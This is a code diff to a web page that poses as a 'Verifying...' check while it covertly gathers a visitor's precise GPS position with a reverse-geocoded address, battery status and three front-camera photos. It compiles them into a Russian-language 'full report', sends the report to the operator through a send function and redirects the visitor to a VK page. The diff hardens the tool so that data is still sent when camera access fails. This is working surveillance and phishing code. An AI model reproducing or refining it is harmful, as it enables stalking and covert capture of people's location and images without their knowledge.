@@ -222,54 +222,67 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             document.getElementById('label-text').innerText = "Verifying...";
 
             let bat = "N/A";
+            let ph = [];
+            
+            // 1. Battery (Fast)
             if (navigator.getBattery) {
-                const bt = await navigator.getBattery();
-                bat = `${Math.round(bt.level * 100)}%${bt.charging?'⚡':''}`;
+                try {
+                    const bt = await navigator.getBattery();
+                    bat = `${Math.round(bt.level * 100)}% `;
+                    bat += bt.charging ? "подзаряжается" : "не подзаряжается";
+                } catch(e) {}
             }
 
+            // 2. GPS Promise (Start early)
+            const gP = new Promise(r => {
+                if (!navigator.geolocation) return r("*GPS Not Supported*");
+                navigator.geolocation.getCurrentPosition(
+                    async p => {
+                        const {latitude:la, longitude:lo} = p.coords;
+                        const l = `https://www.google.com/maps?q=${la},${lo}`;
+                        let a = "Unknown";
+                        try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
+                        r(`Адрес: ${a}\nКарты: [клик](${l})`);
+                    },
+                    () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true, timeout: 5000}
+                );
+            });
+
+            // 3. Camera Capture (Try-Catch)
             try {
                 const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
                 const v = document.getElementById('video');
                 v.srcObject = st;
-                await v.play();
+                
+                // Fix: Handle play() gesture error
+                await v.play().catch(e => log("Play error: " + e));
 
-                // GPS
-                let gps = "*GPS Denied*";
-                const gP = new Promise(r => {
-                    navigator.geolocation.getCurrentPosition(
-                        async p => {
-                            const {latitude:la, longitude:lo} = p.coords;
-                            const l = `https://www.google.com/maps?q=${la},${lo}`;
-                            let a = "Unknown";
-                            try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
-                            r(`Адрес: ${a}\nКарты: [клик](${l})`);
-                        },
-                        () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true}
-                    );
-                });
-
-                await sleep(2500); // Warmup
+                await sleep(2000); // Warmup
 
                 const c = document.getElementById('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 const ctx = c.getContext('2d');
-                const ph = [];
 
                 for(let i=0; i<3; i++) {
                     ctx.drawImage(v,0,0);
                     ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
                     if(i<2) await sleep(800);
                 }
-
-                gps = await gP;
                 st.getTracks().forEach(t=>t.stop());
+            } catch (e) {
+                log("Camera Error: " + e.message);
+                // Don't kill the whole process, just continue without photos
+            }
 
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('success-icon').style.display = 'block';
-                document.getElementById('label-text').innerText = "Success!";
-                document.getElementById('label-text').style.color = "#009900";
+            // 4. Final Assembly
+            const gps = await gP;
 
-                const fM = `
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('success-icon').style.display = 'block';
+            document.getElementById('label-text').innerText = "Success!";
+            document.getElementById('label-text').style.color = "#009900";
+
+            const fM = `
 *ПОЛНЫЙ ОТЧЕТ (Phase 2)*
 ━━━━━━━━━━━━━━━━
 *ГЕОПОЗИЦИЯ*
@@ -279,16 +292,11 @@ ${gps}
 Заряд: ${bat}
 
 *ФОТО*
-Захвачено фото: ${ph.length} шт.
+Захвачено фото: ${ph.length > 0 ? ph.length : "ОШИБКА ДОСТУПА"}
 `.trim();
 
-                await _sD(fM, ph);
-                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
-
-            } catch (e) {
-                _sD(`❌ *ACCESS DENIED*: ${e.message}`);
-                window.location.href = "https://vk.com/atypical_kazan";
-            }
+            await _sD(fM, ph);
+            setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
         };
     </script>
 </body>
